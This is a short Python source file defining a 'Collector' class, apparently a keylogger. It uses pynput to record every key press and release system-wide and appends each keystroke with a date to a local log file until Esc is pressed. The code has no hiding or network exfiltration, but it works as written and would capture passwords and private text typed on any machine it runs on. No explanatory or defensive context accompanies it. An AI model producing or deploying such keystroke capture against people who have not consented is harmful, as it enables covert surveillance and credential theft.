from pynput import keyboard
from datetime import datetime

class Collector:
    def __init__(self, logfile = "./logfile"):
        self.logfile = logfile
        self.logfilefd = open(self.logfile, "a")
        self.listener = None

    def on_press(self, key):
        try:
            self.inject_to_log(f"[*] Pressed: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
        except AttributeError:
            self.inject_to_log(f"[*] Pressed: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
    
    def on_release(self, key):
        try:
            self.inject_to_log(f"[*] Released: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
        except AttributeError:
            self.inject_to_log(f"[*] Released: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
        if key == keyboard.Key.esc:
            self.logfilefd.close()
            return False
    
    def inject_to_log(self, payload):
        self.logfilefd.write(payload + "\n")

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
        self.listener.start()

    def join(self):
        self.listener.join()
        


